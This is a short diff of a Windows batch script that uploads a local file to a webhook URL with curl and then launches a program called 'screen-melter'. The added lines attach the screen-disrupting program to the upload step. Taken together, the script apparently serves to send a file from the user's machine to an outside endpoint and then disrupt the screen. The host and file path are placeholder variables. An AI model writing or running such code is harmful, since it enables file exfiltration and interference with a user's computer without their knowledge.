@@ -15,10 +15,15 @@ if not exist "%FILE_PATH%" (
     exit /b
 )
 
-:: Send the file using curl
+:: Send the file using curl to the webhook
 curl -X POST "%WEBHOOK_URL%" ^
     -F "file=@%FILE_PATH%" ^
     -H "Content-Type: multipart/form-data"
 
 echo File uploaded successfully.
+
+:: Open the screen-melter program
+echo Opening screen-melter...
+start "" "C:\path\to\screen-melter.exe"
+
 pause
